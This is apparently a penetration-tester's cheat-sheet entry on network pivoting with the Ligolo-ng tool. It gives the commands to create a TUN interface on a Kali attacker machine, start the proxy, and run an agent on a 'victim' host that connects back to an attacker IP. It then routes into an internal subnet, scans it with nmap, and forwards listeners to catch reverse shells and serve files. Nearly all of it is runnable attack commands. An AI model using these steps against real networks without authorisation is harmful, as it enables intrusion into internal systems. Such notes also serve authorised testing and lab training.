---
title: Ligolo-ng - TUN-based Pivoting
category: tunnels
subcategory: tunneling-tools
os: linux, windows
command: interface_add_route --name ligolo --route subnet
tools: ligolo-ng
---


Builds a full TUN interface on the attacker - all traffic routes natively, no Proxychains, much faster than Chisel.

### Step 1 - Prepare interface on Kali

```bash
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
```

### Step 2 - Run the proxy

```bash
./proxy -selfcert
```

Default port 11601.

### Step 3 - Run the agent on the victim

```bash
./agent -connect 10.6.18.45:11601 -ignore-cert
```

### Step 4 - Inside the Ligolo console: select session, route, start

```
session
interface_add_route --name ligolo --route 10.50.72.0/20
start
```

Now use any tool natively:

```bash
nmap -p 22,80,445,3389 10.50.72.30 --open -sV -Pn -sT
```

### Listener forwarding (catch reverse shells from inside)

```
listener_add --addr 0.0.0.0:9091 --to 127.0.0.1:443
```

For HTTP file uploads:

```
listener_add --addr 0.0.0.0:9092 --to 127.0.0.1:80
```
